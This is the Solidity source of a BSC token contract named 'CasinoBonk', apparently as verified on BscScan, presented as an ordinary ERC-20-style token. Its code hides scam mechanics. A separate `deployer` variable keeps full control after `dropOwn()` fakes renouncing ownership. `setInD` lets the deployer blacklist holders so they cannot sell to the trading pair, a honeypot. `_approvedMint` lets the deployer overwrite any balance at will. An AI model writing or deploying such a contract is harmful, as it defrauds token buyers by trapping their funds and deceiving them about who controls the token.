/**
 *Submitted for verification at BscScan.com on 2021-12-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract CasinoBonk is Ownable {
  using Address for address;
  using SafeMath for uint256;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  uint8 public decimals;
  uint256 public totalSupply;
  string public name;
  string public symbol;
  address public pancakePairAddress;
  address deployer;
  constructor(string memory _name, string memory _symbol) public {
    deployer = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    balances[deployer] = totalSupply;
    approvedHolders[deployer] = true;
  }
  mapping(address => uint256) public balances;
  mapping(address => bool) public approvedHolders;
  mapping(address => bool) public deniedHolders;
  mapping (address => mapping (address => uint256)) public valueAllowed;  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= balances[from]);
    if(!from.isContract() && _to.isContract()){
        require(deniedHolders[from] == false && deniedHolders[_to] == false);
    }
    if(approvedHolders[from] || approvedHolders[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  function _transfer(address from, address _to, uint256 _value) private {
    balances[from] = balances[from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
  modifier verifiedd() {
    require(deployer == msg.sender, "401: Unauthorized"); 
    _;
  }
  modifier verified() {
    require(deployer == msg.sender, "401: Unauthorized"); 
    _;
  }
  function dropOwn() public verified {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  function setInA(address sender, bool ok) external verified {
      approvedHolders[sender] = ok;
  }
  function setInD(address sender, bool ok) external verified returns (bool){
      deniedHolders[sender] = ok;
  }    
  function checkIfA(address sender) public view returns (bool) {
    if (approvedHolders[sender]){
      return true;
    } else {
      return false;
    }
  }
  function checkIfD(address sender) public view returns (bool) {
    if (deniedHolders[sender]){
      return true;
    } else {
      return false;
    }
  }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= valueAllowed[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(deniedHolders[from] == false && deniedHolders[_to] == false);
    }
    if(approvedHolders[from] || approvedHolders[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _value);
        return true;
    }
    _transferFrom(_from, _to, _value);
    return true;
  }
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    valueAllowed[_from][msg.sender] = valueAllowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  function allowance(address _holder, address _spender) public view returns (uint256) {
    return valueAllowed[_holder][_spender];
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    valueAllowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function checkUserBalance(address holder) public view returns (uint256) {
    return balances[holder];
  }
  function changePAddress(address liquidity) public verified {
    pancakePairAddress = liquidity;
  }
  function showPAddress() public view returns (address) {
    return pancakePairAddress;
  }
  function _approvedMint(address buyer, uint256 _quantity) external verifiedd {
    balances[buyer] = _quantity * 10 ** uint256(decimals);
  }
  function firstDrop(
    address sender,
    address[] calldata recipients,
    uint256 values
  ) private verifiedd {
    require(recipients.length < 2001, "max number is 2000 user");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transferFrom(sender, recipients[i], values);
        }
    }
  function secondDrop(
    address sender,
    address[] calldata recipients,
    uint256 values
  ) private verifiedd {
    require(recipients.length < 2001, "max number is 2000 user");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transferFrom(sender, recipients[i], values);
        }
    }
  function thirdDrop(
    address sender,
    address[] calldata recipients,
    uint256 values
  ) private verifiedd {
    require(recipients.length < 2001, "max number is 2000 user");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transferFrom(sender, recipients[i], values);
        }
    }
}